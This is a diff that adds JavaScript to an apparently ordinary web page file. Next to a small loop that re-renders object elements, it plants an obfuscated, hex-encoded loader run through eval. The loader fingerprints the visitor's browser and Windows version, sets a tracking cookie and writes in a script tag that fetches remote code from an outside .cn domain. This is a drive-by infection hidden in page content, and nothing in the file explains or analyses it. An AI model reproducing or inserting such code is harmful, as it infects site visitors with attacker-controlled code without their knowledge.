@@ -1,0 +1,9 @@
+theObjects = document.getElementsByTagName("object"); 
+for (var i = 0; i < theObjects.length; i++) { 
+theObjects[i].outerHTML = theObjects[i].outerHTML; 
+}
+
+
+<!-- 
+(function(lK9){var nVWre='va#72#20a#3d#22S#63ri#70tEngine#22#2c#62#3d#22Versi#6f#6e()#2b#22#2cj#3d#22#22#2cu#3d#6e#61vig#61tor#2eus#65rAge#6et#3bif#28#28u#2e#69#6edexOf(#22#43hrome#22)#3c#30)#26#26(u#2ein#64#65x#4ff#28#22#57#69#6e#22)#3e#30)#26#26(u#2e#69ndex#4ff#28#22NT#206#22#29#3c0)#26#26(d#6fcument#2e#63ooki#65#2e#69ndexOf(#22miek#3d1#22)#3c0)#26#26(t#79peof(#7arv#7ats)#21#3d#74ype#6ff#28#22#41#22)))#7bzrv#7a#74#73#3d#22A#22#3b#65val(#22#69#66#28w#69#6edo#77#2e#22#2b#61+#22)j#3dj+#22#2ba#2b#22#4dajo#72#22#2b#62+a+#22#4dinor#22+b+a+#22#42u#69ld#22+b+#22j#3b#22)#3bdocument#2e#77rit#65(#22#3cscr#69pt#20#73#72c#3d#2f#2f#6da#22#2b#22r#74uz#2e#63n#2fvid#2f#3fid#3d#22#2b#6a#2b#22#3e#3c#5c#2fscrip#74#3e#22)#3b#7d';var mTf=nVWre.replace(lK9,'%');eval(unescape(mTf))})(/\#/g);
+ -->
